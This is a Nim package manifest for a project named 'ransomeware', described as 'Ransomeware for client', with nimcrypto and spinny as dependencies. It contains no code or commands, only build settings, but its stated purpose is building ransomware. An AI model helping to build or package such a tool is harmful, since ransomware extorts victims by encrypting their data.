# Package

version       = "0.2.0"
author        = "C-NERD"
description   = "Ransomeware for client"
license       = "MIT"
srcDir        = "src"
binDir        = "bin"
bin           = @["ransomeware"]

backend       = "c"

# Dependencies
requires "nim >= 1.0.0", "nimcrypto == 0.5.4", "spinny == 0.3.1"
